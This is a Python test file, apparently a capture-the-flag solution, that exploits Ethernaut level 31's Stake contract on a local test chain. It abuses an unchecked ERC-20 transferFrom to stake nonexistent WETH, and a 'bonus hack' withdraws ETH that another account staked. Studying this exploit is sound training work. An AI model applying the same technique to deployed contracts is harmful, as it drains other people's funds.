from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv31_stake import Stake
from pytypes.contracts.helper.DefaultERC20 import DefaultERC20

@default_chain.connect()
def test_lv31():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv31()
    exploit_lv31(contract, ethernaut.attacker, ethernaut.other_account)
    ethernaut.check_lv31(contract)

def exploit_lv31(contract: Stake, attacker: Account, other_account: Account):
    # Attack vector: StakeWETH() method is not checking result of transferFrom call (transfered)
    # Training: know methods of ERC-20 standard

    weth = DefaultERC20(contract.WETH())

    # other_account approves and performs stake of WETH even if it has no WETH
    weth.approve(contract, 1 * 10**16, from_=other_account)
    contract.StakeWETH(1 * 10**16, from_=other_account)

    # other_account stakes ETH
    contract.StakeETH(value=1 * 10**16 + 10, from_=other_account)

    # attacker stakes ETH and withdraw it to became staker with 0 balance
    contract.StakeETH(value=1 * 10**16, from_=attacker)
    contract.Unstake(1 * 10**16, from_=attacker)
    
    # BONUS hack
    # attacker approves and stakes WETH even if he has no WETH
    weth.approve(contract, 1 * 10**16, from_=attacker)
    contract.StakeWETH(1 * 10**16, from_=attacker)
    # attacker withdraws real ETH somebody else staked
    contract.Unstake(1 * 10**16, from_=attacker)
